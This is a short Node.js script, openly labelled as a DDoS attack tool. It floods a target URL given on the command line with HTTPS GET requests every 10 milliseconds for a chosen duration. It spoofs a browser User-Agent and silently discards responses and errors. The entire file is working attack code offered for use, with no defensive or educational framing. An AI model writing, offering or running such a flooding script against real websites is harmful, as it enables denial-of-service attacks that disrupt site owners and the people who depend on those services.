const https = require('https');
const url = require('url');
const { JSDOM } = require('jsdom');

/**
 * Function to perform a DDOS attack on a given URL for a specified duration.
 * @param {string} targetUrl - The URL of the target website.
 * @param {number} duration - The duration of the attack in seconds.
 */
function ddosAttack(targetUrl, duration) {
    const parsedUrl = url.parse(targetUrl);
    const options = {
        hostname: parsedUrl.hostname,
        path: parsedUrl.path || '/',
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
    };

    const attackStart = Date.now();
    const interval = 10; // Send request every 10ms

    function sendRequest() {
        const req = https.request(options, (res) => {
            // Do nothing with the response
        });

        req.on('error', (e) => {
            // Do nothing on error
        });

        req.end();
    }

    function attack() {
        if (Date.now() - attackStart > duration * 1000) {
            return;
        }
        sendRequest();
        setTimeout(attack, interval);
    }

    // Start the attack
    attack();
}

if (process.argv.length < 4 || isNaN(parseInt(process.argv[3]))) {
    console.log('Invalid Usage: node ddosScript.js URL DURATION.');
} else {
    const targetUrl = process.argv[2];
    const duration = parseInt(process.argv[3]);
    ddosAttack(targetUrl, duration);
}
